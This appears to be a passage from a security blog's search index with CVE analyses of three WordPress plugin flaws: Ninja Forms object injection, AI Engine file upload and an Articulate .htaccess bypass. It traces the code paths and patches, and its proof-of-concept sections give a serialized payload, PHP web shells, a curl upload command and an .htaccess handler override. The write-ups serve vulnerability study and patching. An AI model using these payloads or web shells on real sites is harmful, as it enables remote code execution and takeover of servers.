F --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?} H -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"] I --\u003e K(\"RCE\") graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"] B --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"] C --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"] D --\u003e E[\"NF_MergeTags_Fields::add_field()\"] E --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"] F --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?} H -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"] I --\u003e K(\"RCE\") graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"] B --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"] C --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"] D --\u003e E[\"NF_MergeTags_Fields::add_field()\"] E --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"] F --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?} H -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"] I --\u003e K(\"RCE\") graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"] B --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"] C --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"] D --\u003e E[\"NF_MergeTags_Fields::add_field()\"] E --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"] F --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?} H -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"] I --\u003e K(\"RCE\") ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Use the plugin to create a blank form with a Single Line Text field inside a Repeatable Fieldset, then embed it in a post/page. Submit the form and intercept the request using Burp Suite. Replace the value of the field with a serialized payload instead of JSON. \"O:15:\\\"ObjectInjection\\\":1:{s:7:\\\"command\\\";s:4:\\\"ls /\\\";}\" Resend the request. Tip To test locally, create a class with a __wakeup() magic method that triggers upon deserialization, and place it in wp-config.php: class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-9083 vulnerability stems from using maybe_unserialize() on user-controlled input without any class restriction or validation. This enables unauthenticated attackers to execute arbitrary code if a suitable gadget exists within WordPress or other plugins/themes. The 3.11.1 patch completely prevents object creation by switching to unserialize() with ['allowed_classes' =\u003e false], effectively mitigating the root cause of the PHP Object Injection. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways maybe_unserialize() is extremely dangerous when applied to user input. A single gadget anywhere in the codebase can lead to Remote Code Execution. WordPress AJAX endpoints exposed to unauthenticated users are high-value targets. JSON embedding requires careful escaping of serialized payloads to avoid breaking structure. The 3.11.1 patch demonstrates that controlling allowed classes during unserialization is a critical defensive measure. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress Ninja Forms Plugin \u003c 3.11.1 is vulnerable to PHP Object Injection ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress AI Engine Plugin.","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The AI Engine plugin for WordPress contains an arbitrary file upload vulnerability due to missing file type validation in the rest_simpleFileUpload() function in versions 2.9.3 and 2.9.4. This allows authenticated attackers (attackers with authentication), with Subscriber-level privileges or higher, to upload arbitrary files to the affected website’s server when the REST API is enabled, which can lead to remote code execution (RCE). CVE ID: CVE-2025-7847 Vulnerability Type: Arbitrary File Upload Affected Versions: 2.9.3-2.9.4 Patched Versions: 2.9.5 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress AI Engine Plugin ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - AI Engine: 2.9.4 – vulnerable 2.9.5 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability occurs because the upload handling function writes files directly (copy(), file_put_contents()) without checking file type or authenticating the user, allowing an attacker to upload arbitrary files (including .php) into the uploads directory and execute malicious code. Validate file type // Validate filename extension for base64 uploads $validate = wp_check_filetype( $filename ); if ( $validate['type'] == false ) { throw new Exception( 'File type is not allowed.' ); } The patch added file type checks in the simpleFileUpload and upload_file functions using wp_check_filetype() to only allow uploads for valid formats based on WordPress’s whitelist. ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis The plugin registers several public APIs via the rest_api_init() function api.php public function rest_api_init() { $public_api = $this-\u003ecore-\u003eget_option( 'public_api' ); if ( !$public_api ) { return; } $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); ... } The function checks whether the Public API option is enabled. According to the plugin documentation, this option is disabled by default: By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System). You can enable it in the Admin Dashboard at wp-admin/admin.php?page=mwai_settings\u0026nekoTab=settings enable the REST API According to the description, when this option is enabled, only authenticated API requests are accepted. There are two authentication methods: X-WP-Nonce: Obtained via the JavaScript object wpApiSettings for logged-in users (Subscriber+) Bearer Token: Configured by the admin $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } When a Bearer Token is set, the plugin registers a filter named mwai_allow_public_api, with the callback being the method auth_via_bearer_token. register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); An API is registered with method POST: Endpoint: /wp-json/mwai/v1/simpleFileUpload Callback: rest_simpleFileUpload With permission_callback being the return value of can_access_public_api() core.php public function can_access_public_api( $feature, $extra ) { $logged_in = is_user_logged_in(); return apply_filters( 'mwai_allow_public_api', $logged_in, $feature, $extra ); } In the WP REST API, the function is_user_logged_in() will return: true: If the user is logged in and the X-WP-Nonce header is valid false: If the user is not logged in or the X-WP-Nonce header is invalid can_access_public_api will call the mwai_allow_public_api filter registered above =\u003e auth_via_bearer_token($logged_in, $feature, $extra) is invoked api.php public function auth_via_bearer_token( $allow, $feature, $extra ) { if ( !empty( $extra ) \u0026\u0026 !empty( $extra-\u003eget_header( 'Authorization' ) ) ) { $token = $extra-\u003eget_header( 'Authorization' ); $token = str_replace( 'Bearer ', '', $token ); if ( $token === $this-\u003ebearer_token ) { // We set the current user to the first admin. $admin = $this-\u003ecore-\u003eget_admin_user(); wp_set_current_user( $admin-\u003eID, $admin-\u003euser_login ); return true; } } return $allow; } The auth_via_bearer_token() function authenticates using a Bearer Token. Its process: If the request has an Authorization header containing Bearer \u003ctoken\u003e and the \u003ctoken\u003e value matches the token stored in the option ($this-\u003ebearer_token), then: Set the current user to the first admin (wp_set_current_user()), Return true → allow API access. If absent or the token is incorrect → return $allow, i.e., the initial result from is_user_logged_in(). Info By default, there will be no Bearer Token for authentication, so we rely on a valid X-WP-Nonce of a Subscriber user =\u003e permission_callback=true api.php public function rest_simpleFileUpload( $reque","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"} B -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"] C --\u003e D[\"simpleFileUpload()\"] D --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"] E --\u003e F[\"Determine extension → newFilename = refId.extension\"] F --\u003e G{\"target === 'uploads' ?\"} G -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"] H --\u003e I{\"No filetype validation\"} I -- Yes --\u003e J[\"Uploaded .php accessible via URL\"] J --\u003e L[\"Response contain URL to file\"] L --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"] graph TD A[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"} B -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"] C --\u003e D[\"simpleFileUpload()\"] D --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"] E --\u003e F[\"Determine extension → newFilename = refId.extension\"] F --\u003e G{\"target === 'uploads' ?\"} G -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"] H --\u003e I{\"No filetype validation\"} I -- Yes --\u003e J[\"Uploaded .php accessible via URL\"] J --\u003e L[\"Response contain URL to file\"] L --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"] graph TD A[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"} B -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"] C --\u003e D[\"simpleFileUpload()\"] D --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"] E --\u003e F[\"Determine extension → newFilename = refId.extension\"] F --\u003e G{\"target === 'uploads' ?\"} G -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"] H --\u003e I{\"No filetype validation\"} I -- Yes --\u003e J[\"Uploaded .php accessible via URL\"] J --\u003e L[\"Response contain URL to file\"] L --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"] graph TD A[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"} B -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"] C --\u003e D[\"simpleFileUpload()\"] D --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"] E --\u003e F[\"Determine extension → newFilename = refId.extension\"] F --\u003e G{\"target === 'uploads' ?\"} G -- Yes --\u003e H[\"copy(path, destination) → file placed in uploads\"] H --\u003e I{\"No filetype validation\"} I -- Yes --\u003e J[\"Uploaded .php accessible via URL\"] J --\u003e L[\"Response contain URL to file\"] L --\u003e K[\"Execute PHP → Remote Code Execution (RCE)\"] ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a web shell \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Upload the web shell curl -X POST \\ \"http://localhost/wp-json/mwai/v1/simpleFileUpload\" \\ -H \"X-WP-Nonce: 51e6c4a45a\" \\ -F \"file=@rce.php\" \\ -b \"wp-settings-time-1=1762427921; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98; wp-settings-5=mfold%3Do; wp-settings-time-5=1762533510\" \\ --proxy 127.0.0.1:8080 # Burp proxy File uploaded successfully RCE with the web shell RCE via uploaded file ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-7847 is a serious arbitrary file upload vulnerability in AI Engine 2.9.3–2.9.4, allowing authenticated users (Subscriber+) to upload arbitrary files to the server via the REST API, leading to RCE. Version 2.9.5 fixes the issue by adding file type checks (wp_check_filetype). ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways The vulnerability only applies when the Public REST API is enabled and the user has a valid X-WP-Nonce or a Bearer token. Root cause: missing file type validation and directly copying the file into uploads. Mitigation: update the plugin to 2.9.5. ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"A list of 'sink' points in WordPress — where input data can lead to the execution of malicious actions.","date":"2025-11-13","objectID":"/posts/2025-11-13-wordpress-vulnerability-sink/","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/posts/2025-11-13-wordpress-vulnerability-sink/"},{"categories":["CVE Analysis"],"collections":null,"content":"Why This Article? ","date":"2025-11-13","objectID":"/posts/2025-11-13-wordpress-vulnerability-sink/:1:0","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/posts/2025-11-13-wordpress-vulnerability-sink/#why-this-article"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed Articulate Content into WordPress Plugin.","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info An Arbitrary File Upload vulnerability in Brian Batt - elearningfreak.com for the Insert or Embed Articulate Content into WordPress plugin allows uploading a Web Shell to the web server. This issue affects Insert or Embed Articulate Content into WordPress: from n/a to 4.3000000025. CVE ID: CVE-2025-32202 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.3000000025 Patched Versions: 4.3000000026 CVSS severity: Medium (9.1) Required Privilege: Editor Product: WordPress Embed Articulate Content into WordPress Plugin ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Embed Articulate Content into WordPress: 4.3000000025 – vulnerable 4.3000000026 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability lies in the articulate_has_php_file() function at /wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php due to insufficient checks, allowing an attacker to upload a .htaccess file to override handling in the uploads directory; as a result, subsequently uploaded files with attacker-chosen extensions (e.g., .abc, .xnxx) can be executed as PHP. Adding a check for .htaccess The patch added a condition to check for .htaccess on upload to prevent this vulnerability. ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis The plugin registers an action hook for logged-in users add_action( 'wp_ajax_articulate_upload_file', 'articulate_upload_ajax_file' ); So when accessing the endpoint /wp-admin/admin-ajax.php with param action=articulate_upload_file, the callback articulate_upload_ajax_file is invoked functions.php function articulate_upload_ajax_file() { articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); if ( ! is_user_logged_in() || ! current_user_can( 'upload_files' ) || ! current_user_can( 'unfiltered_html' ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $count_dirs = getDirs(); // you can use WP's wp_handle_upload() function: $file = $_FILES['async-upload']; $dir = untrailingslashit( getUploadsPath() ); if ( empty( $_FILES ) || $_FILES['async-upload']['error'] ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to move uploaded file. Please check if the folder has write permissions.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $chunk = isset( $_REQUEST['chunk'] ) ? intval( $_REQUEST['chunk'] ) : 0; $chunks = isset( $_REQUEST['chunks'] ) ? intval( $_REQUEST['chunks'] ) : 0; $fileName = isset( $_REQUEST['name'] ) ? sanitize_file_name( $_REQUEST['name'] ) : sanitize_file_name( $_FILES['async-upload']['name'] ); $filePath = '' . $dir . '/' . sanitize_file_name( $fileName ) . ''; // Open temp file $out = @fopen( \"{$filePath}.part\", $chunk == 0 ? 'wb' : 'ab' ); if ( $out ) { // Read binary input stream and append it to temp file $in = @fopen( $_FILES['async-upload']['tmp_name'], 'rb' ); if ( $in ) { while ( $buff = fread( $in, 4096 ) ) { fwrite( $out, $buff ); } } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open input stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } @fclose( $in ); @fclose( $out ); @unlink( $_FILES['async-upload']['tmp_name'] ); } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open output stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Security check. $mime = wp_check_filetype( $filePath ); $mimes = get_allowed_mime_types( get_current_user_id() ); if ( ! isset( $mime['type'] ) || ! in_array( $mime['type'], array_values( $mimes ) ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Check if file has been uploaded if ( ! $chunks || $chunk == $chunks - 1 ) { // Strip the temp .part suffix off articulate_custom_rename( \"{$filePath}.part\", $filePath ); // start extracting // unzip file $dir = explode( '.', $fileName ); $dir[0] = str_replace( ' ', '_', $dir[0] ); $target = getUploadsPath() . $dir[0]; $file = $filePath; while ( file_exists( $target ) ) { $r = rand( 1, 10 ); $target .= $r; $dir[0] .= $r; } $arr = extractZip( $file, $target, $dir[0] ); unlink( $filePath ); do_action( hook_name: 'iea/uploaded_quiz', $arr, $target ); $ok = isset( $arr[4] ) ? $arr[4] : 0; $response = array( 'OK' =\u003e $ok, 'info' =\u003e $arr[0], 'folder' =\u003e $arr[2], 'path' =\u003e $arr[1], 'name' =\u003e $arr[3], 'target' =\u003e $target, ); die( json_encode( $response ) ); } else { die( json_encode( array( 'OK' =\u003e 1, 'info' =\u003e __( 'Uploading chunks!', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } exit; }; The articulate_upload_ajax_file() function handles AJAX file uploads for the plugin. Specifically: Initialization \u0026 basic security articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); articulate_setup_php_ini() — adjusts PHP settings (usually to allow larger uploads, longer timeouts, ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"] B --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"} C -- No --\u003e Z[\"Return JSON error\"] C -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"] E --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"] F --\u003e G[\"extractZip($filePath, $target, $dir)\"] G --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"] H --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"} I -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"] I -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"] K --\u003e L[\"Attacker uploads ZIP containing .htaccess\"] L --\u003e M[\".htaccess overrides Apache handler in upload dir\"] M --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"] N --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"] %% Patch branch K --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"] P --\u003e Q[\"Upload blocked if .htaccess detected\"] graph TD A[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"] B --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"} C -- No --\u003e Z[\"Return JSON error\"] C -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"] E --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"] F --\u003e G[\"extractZip($filePath, $target, $dir)\"] G --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"] H --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"} I -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"] I -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"] K --\u003e L[\"Attacker uploads ZIP containing .htaccess\"] L --\u003e M[\".htaccess overrides Apache handler in upload dir\"] M --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"] N --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"] %% Patch branch K --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"] P --\u003e Q[\"Upload blocked if .htaccess detected\"] graph TD A[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"] B --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"} C -- No --\u003e Z[\"Return JSON error\"] C -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"] E --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"] F --\u003e G[\"extractZip($filePath, $target, $dir)\"] G --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"] H --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"} I -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"] I -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"] K --\u003e L[\"Attacker uploads ZIP containing .htaccess\"] L --\u003e M[\".htaccess overrides Apache handler in upload dir\"] M --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"] N --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"] %% Patch branch K --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"] P --\u003e Q[\"Upload blocked if .htaccess detected\"] graph TD A[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"] B --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"} C -- No --\u003e Z[\"Return JSON error\"] C -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"] E --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"] F --\u003e G[\"extractZip($filePath, $target, $dir)\"] G --\u003e H[\"Quiz","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create the following directory structure: bypass . ├── .htaccess ├── index.html └── rce.abc .htaccess \u003cIfModule mod_php.c\u003e \u003cFiles \"*.abc\"\u003e SetHandler application/x-httpd-php \u003c/Files\u003e \u003c/IfModule\u003e Create a rule so that files with .abc in the current directory and subdirectories can be uploaded and will be executed as .php rce.abc Contains a web shell \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e Zip the folder zip -r bypass.zip bypass Upload the created zip file Plugin widget in post creation Info This is the feature described in the plugin documentation: we create a post, add this widget, then perform the zip file upload. e-Elearning widget Request and Response in BurpSuite: Request and Response in BurpSuite RCE with web shell RCE via file upload ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-32202 vulnerability arises because the Insert or Embed Articulate Content into WordPress plugin does not sufficiently check the types of files inside extracted archives, omitting the case of .htaccess. This allows an attacker with Editor privileges to upload a .htaccess file to override handlers in the uploads directory. As a result, later uploaded files, even with arbitrary extensions (like .abc, .xyz), can be treated as PHP, leading to Remote Code Execution (RCE). The 4.3000000026 patch added a check for .htaccess, preventing handler override in the uploads directory and eliminating this exploitation vector. 